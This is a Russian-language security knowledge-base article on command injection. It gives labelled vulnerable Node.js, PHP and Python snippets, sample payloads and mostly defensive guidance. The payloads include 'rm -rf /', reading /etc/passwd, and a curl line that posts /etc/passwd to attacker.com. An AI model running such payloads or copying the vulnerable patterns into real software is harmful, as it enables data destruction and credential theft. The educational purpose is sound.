---
aliases: ["Командные инъекции", "Command Injection", "Shell Injection"]
tags: [security, injection, command]
created: 2025-11-18
updated: 2025-11-18
---

# Командные инъекции

Командные инъекции (Command Injection) - это уязвимость, при которой злоумышленник может выполнить произвольные команды операционной системы на сервере, вводя специальные символы или последовательности в параметры, передаваемые в системные команды.

## Введение

Командные инъекции происходят, когда приложение неправильно обрабатывает пользовательский ввод перед передачей его в системные вызовы или команды оболочки. Это позволяет злоумышленнику выполнить произвольные команды на сервере, что может привести к компрометации системы.

## Механизм атаки

### Принцип работы

При командной инъекции злоумышленник:

1. Находит точку входа, где пользовательский ввод передается в системную команду
2. Вводит специальные символы для разделения команд
3. Выполняет произвольные команды в контексте приложения
4. Получает доступ к системе или данным

### Распространенные символы инъекции

- `;` - разделитель команд
- `&&` - логическое И
- `||` - логическое ИЛИ
- `|` - конвейер команд
- `&` - выполнение в фоне
- `$()` - подстановка команд
- `` ` ` `` - подстановка команд (обратные кавычки)
- `\n` - новая строка

## Примеры уязвимостей

### Уязвимый код на Node.js

```javascript
// НЕБЕЗОПАСНЫЙ КОД - НЕ ИСПОЛЬЗУЙТЕ
const { exec } = require('child_process');

app.get('/ping', (req, res) => {
  const host = req.query.host;
  // Уязвимость: прямая передача пользовательского ввода
  exec(`ping -c 1 ${host}`, (error, stdout, stderr) => {
    if (error) {
      res.send(`Error: ${error.message}`);
      return;
    }
    res.send(`<pre>${stdout}</pre>`);
  });
});
```

Атакующий может использовать:

```
http://example.com/ping?host=google.com;rm -rf /
```

### Уязвимый код на PHP

```php
// НЕБЕЗОПАСНЫЙ КОД - НЕ ИСПОЛЬЗУЙТЕ
$filename = $_GET['filename'];
// Уязвимость: прямая передача пользовательского ввода
$output = shell_exec("ls -la " . $filename);
echo "<pre>" . $output . "</pre>";
```

Атакующий может использовать:

```
?filename=;cat /etc/passwd
```

### Уязвимый код на Python

```python
# НЕБЕЗОПАСНЫЙ КОД - НЕ ИСПОЛЬЗУЙТЕ
import subprocess
from flask import Flask, request

@app.route('/execute')
def execute():
    command = request.args.get('cmd')
    # Уязвимость: прямая передача пользовательского ввода
    result = subprocess.check_output(command, shell=True)
    return result
```

## Типы командных инъекций

### Прямая инъекция

Пользовательский ввод напрямую вставляется в команду:

```bash
# Ввод: google.com; whoami
ping -c 1 google.com; whoami
```

### Обратная инъекция

Результат выполнения команды направляется обратно атакующему:

```bash
# Ввод: google.com | curl -X POST -d @/etc/passwd http://attacker.com
ping -c 1 google.com | curl -X POST -d @/etc/passwd http://attacker.com
```

### Временная инъекция

Команды выполняются асинхронно или с задержкой:

```bash
# Ввод: google.com & sleep 10 && rm important_file
ping -c 1 google.com & sleep 10 && rm important_file
```

## Последствия атак

### Компрометация системы

- Выполнение произвольных команд
- Установка вредоносного ПО
- Изменение конфигурации системы
- Получение root-прав

### Утечка данных

- Чтение конфиденциальных файлов
- Дамп баз данных
- Кража учетных данных
- Доступ к файлам других пользователей

### Отказ в обслуживании

- Удаление критических файлов
- Переполнение дискового пространства
- Запуск ресурсоемких процессов
- Зависание системы

## Методы обнаружения

### Статический анализ

Поиск потенциально опасных функций:

- `exec()`, `system()`, `shell_exec()` в PHP
- `os.system()`, `subprocess` с `shell=True` в Python
- `child_process.exec()` в Node.js
- `Runtime.exec()` в Java

### Динамическое тестирование

Использование специальных символов:

```
; whoami
&& whoami
| whoami
`whoami`
$(whoami)
```

### Мониторинг системы

- [[Анализ-логов]] системных вызовов
- Отслеживание необычных процессов
- [[Сигнализация-безопасности]] для подозрительных команд
- [[Инструменты-мониторинга-безопасности]]

## Методы защиты

### Избегание системных вызовов

Не передавать пользовательский ввод в системные команды:

```javascript
// Лучше: использовать безопасные API
const dns = require('dns');
dns.lookup(host, (err, address) => {
  // Обработка результата
});
```

### Правильное использование subprocess

В Python использовать безопасные методы:

```python
# ПЛОХО
subprocess.check_output(command, shell=True)

# ХОРОШО
import shlex
args = shlex.split(user_input)
subprocess.check_output(['ls', '-la'] + args)
```

### Валидация и фильтрация

```javascript
// Валидация входных данных
function validateHostname(hostname) {
  // Проверка формата hostname
  const hostnameRegex = /^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9](\.[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9])*$/;
  return hostnameRegex.test(hostname);
}

// Использование белого списка
const allowedHosts = ['google.com', 'github.com', 'npmjs.org'];
if (!allowedHosts.includes(userInput)) {
  throw new Error('Invalid host');
}
```

### Санитизация входных данных

```javascript
// Экранирование специальных символов
function sanitizeInput(input) {
  return input.replace(/[;&|`$<>]/g, '');
}

// Ограничение длины и содержимого
function validateInput(input) {
  if (input.length > 255) {
    throw new Error('Input too long');
  }
  
  // Проверка на наличие специальных символов
  if (/[;&|`$<>]/.test(input)) {
    throw new Error('Invalid characters in input');
  }
  
  return input;
}
```

### Использование безопасных оберток

```javascript
// Использование безопасных библиотек
const { spawn } = require('child_process');

// Вместо exec использовать spawn с массивом аргументов
const child = spawn('ping', ['-c', '1', validatedHost]);
```

## Практические примеры защиты

### Защита в Node.js

```javascript
const { spawn } = require('child_process');
const path = require('path');

// Безопасная функция для выполнения команд
function safeExecute(command, args, options = {}) {
  // Проверка разрешенных команд
  const allowedCommands = ['ping', 'ls', 'cat', 'grep'];
  if (!allowedCommands.includes(command)) {
    throw new Error('Command not allowed');
  }
  
  // Проверка аргументов
  const sanitizedArgs = args.map(arg => {
    // Удаление потенциально опасных символов
    if (/[\n\r;&|`$<>]/.test(arg)) {
      throw new Error('Invalid characters in argument');
    }
    return arg;
  });
  
  return new Promise((resolve, reject) => {
    const child = spawn(command, sanitizedArgs, options);
    let stdout = '';
    let stderr = '';
    
    child.stdout.on('data', data => stdout += data);
    child.stderr.on('data', data => stderr += data);
    
    child.on('close', code => {
      if (code === 0) {
        resolve(stdout);
      } else {
        reject(new Error(stderr));
      }
    });
  });
}
```

### Защита в Python

```python
import subprocess
import re
from pathlib import Path

def safe_command(cmd, allowed_commands):
    """Безопасное выполнение команд"""
    # Разделение команды на части
    parts = cmd.split()
    if not parts:
        raise ValueError("Empty command")
    
    # Проверка разрешенной команды
    if parts[0] not in allowed_commands:
        raise ValueError("Command not allowed")
    
    # Проверка аргументов
    for arg in parts[1:]:
        if re.search(r'[;&|`$<>]', arg):
            raise ValueError("Invalid characters in arguments")
    
    # Выполнение команды с безопасными аргументами
    result = subprocess.run(parts, capture_output=True, text=True, timeout=30)
    return result.stdout
```

## Лучшие практики

### Принцип наименьших привилегий

- Запуск приложений с минимальными правами
- Использование изолированных сред выполнения
- Ограничение доступа к системным ресурсам
- [[Управление-доступом]] к системным командам

### Валидация на всех уровнях

- Проверка на клиенте (для удобства)
- Обязательная проверка на сервере
- Проверка типов и форматов
- Использование схем данных

### Логирование и мониторинг

- Журналирование всех системных вызовов
- [[Анализ-логов]] для обнаружения аномалий
- Интеграция с [[Сигнализация-безопасности]]
- Регулярный аудит системных команд

## Тестирование на уязвимости

### Автоматизированные инструменты

- OWASP ZAP
- Burp Suite
- Nikto
- Nmap с NSE скриптами

### Ручное тестирование

- Тестирование специальных символов
- Проверка обработки ошибок
- Анализ поведения системы
- Тестирование граничных значений

> [!tip] Совет
> Используйте безопасные API вместо системных вызовов, когда это возможно.

> [!warning] Важно
> Никогда не передавайте пользовательский ввод напрямую в системные команды без тщательной валидации.

## Заключение

Командные инъекции представляют серьезную угрозу безопасности приложений. Для предотвращения таких уязвимостей необходимо использовать безопасные методы программирования, валидировать все входные данные и избегать прямой передачи пользовательского ввода в системные команды.